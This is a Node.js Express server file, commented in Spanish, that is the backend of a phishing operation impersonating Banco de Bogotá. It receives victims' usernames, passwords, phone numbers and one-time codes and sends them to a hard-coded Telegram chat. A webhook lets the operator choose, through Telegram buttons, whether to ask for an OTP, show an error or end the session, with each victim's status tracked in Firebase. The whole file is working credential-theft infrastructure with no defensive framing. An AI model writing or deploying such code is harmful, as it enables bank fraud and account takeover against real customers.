const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const { initializeApp } = require('firebase-admin/app');
const { getDatabase } = require('firebase-admin/database');

initializeApp({
  databaseURL: process.env.FIREBASE_DB_URL
});

const db = getDatabase();
const app = express();

app.use(cors());
app.use(express.json());

const TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = "7924619096";

// Ruta para enviar alerta a Telegram
app.post('/enviar-alerta-telegram', async (req, res) => {
    const { tipo, datos, sessionId } = req.body;
    let mensaje = "";
    
    let tecladoBotones = {
        inline_keyboard: []
    };

    if (tipo === 'login') {
        mensaje = `🚨 *Nuevo Login — Banco de Bogotá*\n\n👤 Usuario: \`${datos.usuario}\`\n🔑 Clave: \`${datos.clave}\`\n📱 Celular: \`${datos.phone}\``;
        // Botones SI / NO para Login que envían el sessionId exacto
        tecladoBotones.inline_keyboard = [
            [
                { text: "✅ SÍ (Pedir OTP)", callback_data: `otp_${sessionId}` },
                { text: "❌ NO (Error Clave)", callback_data: `errlogin_${sessionId}` }
            ]
        ];
    } else if (tipo === 'otp') {
        mensaje = `🔐 *OTP Ingresado*\n\n🔑 Código: \`${datos.code}\`\n📱 Celular: \`${datos.phone}\``;
        // Botones SI / NO para OTP que envían el sessionId exacto
        tecladoBotones.inline_keyboard = [
            [
                { text: "✅ SÍ (Finalizar)", callback_data: `fin_${sessionId}` },
                { text: "❌ NO (Error OTP)", callback_data: `errotp_${sessionId}` }
            ]
        ];
    }

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mensaje,
                parse_mode: 'Markdown',
                reply_markup: tecladoBotones
            })
        });
        res.status(200).json({ success: true });
    } catch (e) {
        console.error("Error enviando mensaje a Telegram", e);
        res.status(500).json({ error: "Error al enviar" });
    }
});

// Ruta del Webhook de Telegram
// Ruta del Webhook de Telegram
app.post('/webhook-telegram', async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const query = update.callback_query;
        const accion = query.data; // Ej: otp_sess_123456 o errlogin_sess_123456
        const callbackQueryId = query.id;

        const partes = accion.split('_');
        const comando = partes[0]; // otp, errlogin, fin, errotp
        const sessionId = partes.slice(1).join('_');

        if (sessionId) {
            const sessionRef = db.ref(`sessions/${sessionId}`);

            if (comando === 'otp') {
                await sessionRef.update({ status: 'otp' });
                await confirmarBotonTelegram(callbackQueryId, "✅ Solicitando OTP...");
            } else if (comando === 'errlogin') {
                await sessionRef.update({ status: 'error_login' });
                await confirmarBotonTelegram(callbackQueryId, "❌ Error de Clave");
            } else if (comando === 'errotp') {
                await sessionRef.update({ status: 'otp_error' });
                await confirmarBotonTelegram(callbackQueryId, "⚠️ Error de OTP");
            } else if (comando === 'fin') {
                await sessionRef.update({ status: 'finalizar' });
                await confirmarBotonTelegram(callbackQueryId, "🏁 Sesión finalizada");
            }
        }
    }

    res.sendStatus(200);
});

async function confirmarBotonTelegram(callbackQueryId, texto) {
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQueryId, text: texto, show_alert: false })
        });
    } catch (e) {
        console.error("Error al responder a Telegram", e);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
